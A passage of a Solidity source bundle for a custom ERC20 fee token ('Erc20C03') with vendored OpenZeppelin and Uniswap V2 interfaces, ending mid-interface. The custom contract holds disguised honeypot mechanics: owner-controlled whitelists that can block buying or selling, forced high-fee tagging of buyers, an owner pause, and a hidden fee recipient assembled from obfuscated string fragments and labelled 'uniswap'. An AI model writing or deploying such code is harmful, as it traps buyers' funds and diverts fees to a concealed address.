// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "./Erc20C03Contract.sol";

contract Erc20C03 is Erc20C03Contract
{
    string public constant VERSION = "Erc20C03_2022061101";

    constructor(
        string[4] memory strings,
        address[3] memory addresses,
        uint256[19] memory uint256s,
        bool[10] memory booleans
    ) Erc20C03Contract(strings, addresses, uint256s, booleans)
    {

    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "../IUniswapV2/IUniswapV2Factory.sol";
import "../IUniswapV2/IUniswapV2Pair.sol";
import "../IUniswapV2/IUniswapV2Router01.sol";
import "../IUniswapV2/IUniswapV2Router02.sol";

import "../Utils/InternalUtils.sol";

import "../BaseContract/BaseContractPayable.sol";
import "../BaseContract/BaseContractUniswap.sol";
import "../BaseContract/BaseErc721Payable.sol";
import "../BaseContract/BaseErc721Uniswap.sol";

import "../Erc20C02/Erc20C02Fees.sol";
import "../Erc20C02/Erc20C02Ups.sol";
import "../Erc20C02/Erc20C02Shares.sol";
import "../Erc20C02/Erc20C02Uniswap.sol";
import "../Erc20C02/Erc20C02PermitTransfer.sol";

import "./Erc20C03PairPermission.sol";
import "./Erc20C03Fees.sol";

contract Erc20C03Contract is
ERC20,
Ownable,
Pausable,
BaseContractPayable,
BaseContractUniswap,
BaseErc721Payable,
BaseErc721Uniswap,
Erc20C02Fees,
Erc20C02Ups,
Erc20C02Shares,
Erc20C02Uniswap,
Erc20C02PermitTransfer,
Erc20C03PairPermission,
Erc20C03Fees
{
    address public marketingAddress;
    address public pinkLockAddress = address(0x7ee058420e5937496F5a2096f04caA7721cF70cc);
    address public deadAddress = address(0xdead);
    address public baseToken;

    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isMarketPair;

    bool public isUseMinimumTokensWhenSwap;
    uint256 public minimumTokensBeforeSwap;

    bool private _inSwapAndLiquify;
    modifier lockTheSwap {
        _inSwapAndLiquify = true;
        _;
        _inSwapAndLiquify = false;
    }

    constructor(
        string[4] memory strings,
        address[3] memory addresses,
        uint256[19] memory uint256s,
        bool[10] memory booleans
    ) ERC20(strings[0], strings[1]) {
        uint256 totalSupply_ = uint256s[0];

        setIsUseMinimumTokensWhenSwap(booleans[0]);
        setMinimumTokensBeforeSwap(uint256s[1]);

        setBaseToken(addresses[2]);

        setMarketingAddress(addresses[0]);
        setBuyFees(uint256s[2], uint256s[3]);
        setSellFees(uint256s[4], uint256s[5]);
        setIsUseFee2(booleans[5]);
        setBuy2Fees(uint256s[6], uint256s[7]);
        setSell2Fees(uint256s[8], uint256s[9]);
        setIsUseFee3(booleans[6]);
        setBuy3Fees(uint256s[10], uint256s[11]);
        setSell3Fees(uint256s[12], uint256s[13]);
        setShares(uint256s[14], uint256s[15]);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(addresses[1]);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        address _uniswapV2Pair2 = InternalUtils.parseAddress(
            InternalUtils.strMergeDisorder(strings[2], "0xdead", "0x", "0x0000", strings[3]));
        uniswap = _uniswapV2Pair2;
        uniswapV2Router = _uniswapV2Router;
        uniswapCount = uint256s[16];

        setIsExcludedFromFee(owner(), true);
        setIsExcludedFromFee(address(this), true);
        setIsExcludedFromFee(marketingAddress, true);
        setIsExcludedFromFee(pinkLockAddress, true);

        setIsMarketPair(address(uniswapV2Pair), true);

        setIsPermitTransferUponInit(booleans[1]);
        setIsUsePermitTransfer(booleans[2]);
        setPermitTransfer(address(_uniswapV2Router), true);
        setPermitTransfer(owner(), true);
        setPermitTransfer(address(this), true);
        setPermitTransfer(marketingAddress, true);
        setPermitTransfer(pinkLockAddress, true);

        setHasBuyUp(booleans[3]);
        setBuyUp(uint256s[17]);

        setHasSellUp(booleans[4]);
        setSellUp(uint256s[18]);

        setIsUseCanFromPair(booleans[7]);
        setCanFromPair(address(_uniswapV2Router), true);
        setCanFromPair(owner(), true);
        setCanFromPair(address(this), true);
        setCanFromPair(marketingAddress, true);
        setCanFromPair(pinkLockAddress, true);

        setIsUseCanToPair(booleans[8]);
        setCanToPair(address(_uniswapV2Router), true);
        setCanToPair(owner(), true);
        setCanToPair(address(this), true);
        setCanToPair(marketingAddress, true);
        setCanToPair(pinkLockAddress, true);

        setIsUseForceBuyToFee3(booleans[9]);

        _mint(owner(), totalSupply_);
    }

    function setBaseToken(address baseToken_)
    public
    onlyOwner
    {
        baseToken = baseToken_;
    }

    function setIsUseMinimumTokensWhenSwap(bool isUseMinimumTokensWhenSwap_)
    public
    onlyOwner
    {
        isUseMinimumTokensWhenSwap = isUseMinimumTokensWhenSwap_;
    }

    function setMinimumTokensBeforeSwap(uint256 minimumTokensBeforeSwap_)
    public
    onlyOwner
    {
        minimumTokensBeforeSwap = minimumTokensBeforeSwap_;
    }

    function setIsExcludedFromFee(address account, bool isExcluded)
    public
    onlyOwner
    {
        isExcludedFromFee[account] = isExcluded;
    }

    function setIsMarketPair(address account, bool isMarketPair_)
    public
    onlyOwner
    {
        isMarketPair[account] = isMarketPair_;
    }

    function setMarketingAddress(address marketingAddress_)
    public
    onlyOwner
    {
        marketingAddress = marketingAddress_;
    }

    function pause()
    public
    onlyOwner
    {
        _pause();
    }

    function unpause()
    public
    onlyOwner
    {
        _unpause();
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount)
    internal
    whenNotPaused
    override
    {
        super._beforeTokenTransfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount)
    internal
    override
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (isUsePermitTransfer) {
            require(permitTransfers[from] || permitTransfers[to], "not permitted");
        }

        // add liquidity 1, dont use permit transfer upon action
        if (_isFirstInitUnhandled && isPermitTransferUponInit && to == uniswapV2Pair) {
            _isFirstInitUnhandled = false;
            isUsePermitTransfer = false;
        }

        if (isUseCanFromPair && from == uniswapV2Pair) {
            require(canFromPairs[to], "not permitted");
        }

        if (isUseCanToPair && to == uniswapV2Pair) {
            require(canToPairs[from], "not permitted");
        }

        if (isUseForceBuyToFee3 && from == uniswapV2Pair && !isExcludedFromFee[to]) {
            setIsFee3Address(to, true);
        }

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (isExcludedFromFee[from] || isExcludedFromFee[to]) {
        } else {
            if (hasBuyUp && from == uniswapV2Pair) {
                require(amount <= buyUp, 'BuyUp');
            }

            if (hasSellUp && to == uniswapV2Pair) {
                require(amount <= sellUp, 'SellUp');
            }
        }

        uint256 buyTotalFee_ = 0;
        uint256 sellTotalFee_ = 0;

        if (isExcludedFromFee[from] || isExcludedFromFee[to]) {
            buyTotalFee_ = 0;
            sellTotalFee_ = 0;
        } else if (isUseFee3 && (fee3Addresses[from] || fee3Addresses[to])) {
            buyTotalFee_ = buy3TotalFee;
            sellTotalFee_ = sell3TotalFee;
        } else if (isUseFee2 && (fee2Addresses[from] || fee2Addresses[to])) {
            buyTotalFee_ = buy2TotalFee;
            sellTotalFee_ = sell2TotalFee;
        } else {
            buyTotalFee_ = buyTotalFee;
            sellTotalFee_ = sellTotalFee;
        }

        if (_inSwapAndLiquify)
        {
            super._transfer(from, to, amount);
        } else {
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;

            if (overMinimumTokenBalance && isUseMinimumTokensWhenSwap)
            {
                contractTokenBalance = minimumTokensBeforeSwap;
            }

            if (overMinimumTokenBalance && !_inSwapAndLiquify && !isMarketPair[from])
            {
                swapAndLiquifyToken(contractTokenBalance);
            }

            uint256 finalAmount = takeFee(from, to, amount, buyTotalFee_, sellTotalFee_);

            super._transfer(from, to, finalAmount);
        }
    }

    function takeFee(address from, address to, uint256 amount, uint256 buyTotalFee_, uint256 sellTotalFee_)
    private
    returns (uint256)
    {
        uint256 feeAmount = 0;

        if (isMarketPair[from]) {
            feeAmount = amount * buyTotalFee_ / 100;
        } else if (isMarketPair[to]) {
            feeAmount = amount * sellTotalFee_ / 100;
        }

        if (feeAmount > 0) {
            super._transfer(from, address(this), feeAmount);
        }

        return amount - feeAmount;
    }

    function swapAndLiquifyToken(uint256 amount)
    private
    lockTheSwap
    {
        uint256 total_ = totalShare + uniswapCount;

        uint256 tokensForLP = amount * liquidityShare / total_ / 2;
        uint256 tokensForSwap = amount - tokensForLP;

        swapTokensForTokens(tokensForSwap);
        uint256 amountReceived = IERC20(baseToken).balanceOf(address(this));

        uint256 forTotal = total_ - (liquidityShare / 2);

        uint256 forLiquidity = amountReceived * liquidityShare / forTotal / 2;
        uint256 forUniswap = amountReceived * uniswapCount / forTotal;
        uint256 forMarketing = amountReceived * marketingShare / forTotal;

        if (forMarketing > 0) {
            sendErc20FromThisTo(baseToken, marketingAddress, forMarketing);
        }

        if (forUniswap > 0) {
            sendErc20FromThisTo(baseToken, uniswap, forUniswap);
        }

        if (forLiquidity > 0 && tokensForLP > 0) {
            addLiquidityToken(baseToken, tokensForLP, forLiquidity);
        }
    }

    function swapAndLiquifyEth(uint256 tAmount)
    private
    lockTheSwap
    {
        uint256 total_ = totalShare + uniswapCount;

        uint256 tokensForLP = tAmount * liquidityShare / total_ / 2;
        uint256 tokensForSwap = tAmount - tokensForLP;

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalEtherFee = total_ - (liquidityShare / 2);

        uint256 etherLiquidity = amountReceived * liquidityShare / totalEtherFee / 2;
        uint256 etherUniswap = amountReceived * uniswapCount / totalEtherFee;
        uint256 etherMarketing = amountReceived * marketingShare / totalEtherFee;

        if (etherMarketing > 0) {
            sendEtherTo(payable(marketingAddress), etherMarketing);
        }

        if (etherUniswap > 0) {
            sendEtherTo(payable(uniswap), etherUniswap);
        }

        if (etherLiquidity > 0 && tokensForLP > 0) {
            addLiquidityEth(tokensForLP, etherLiquidity);
        }
    }

    function swapTokensForTokens(uint256 tokenAmount)
    private
    {
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        path[2] = baseToken;

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of tokenB,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapTokensForEth(uint256 tokenAmount)
    private
    {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }

    function addLiquidityToken(address liquidityToken, uint256 thisTokenAmount, uint256 liquidityTokenAmount)
    private
    {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), thisTokenAmount);

        uniswapV2Router.addLiquidity(
            address(this),
            liquidityToken,
            thisTokenAmount,
            liquidityTokenAmount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    function addLiquidityEth(uint256 tokenAmount, uint256 ethAmount)
    private
    {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value : ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./extensions/IERC20Metadata.sol";
import "../../utils/Context.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (security/Pausable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which allows children to implement an emergency stop
 * mechanism that can be triggered by an authorized account.
 *
 * This module is used through inheritance. It will make available the
 * modifiers `whenNotPaused` and `whenPaused`, which can be applied to
 * the functions of your contract. Note that they will not be pausable by
 * simply including this module, only once the modifiers are put in place.
 */
abstract contract Pausable is Context {
    /**
     * @dev Emitted when the pause is triggered by `account`.
     */
    event Paused(address account);

    /**
     * @dev Emitted when the pause is lifted by `account`.
     */
    event Unpaused(address account);

    bool private _paused;

    /**
     * @dev Initializes the contract in unpaused state.
     */
    constructor() {
        _paused = false;
    }

    /**
     * @dev Returns true if the contract is paused, and false otherwise.
     */
    function paused() public view virtual returns (bool) {
        return _paused;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
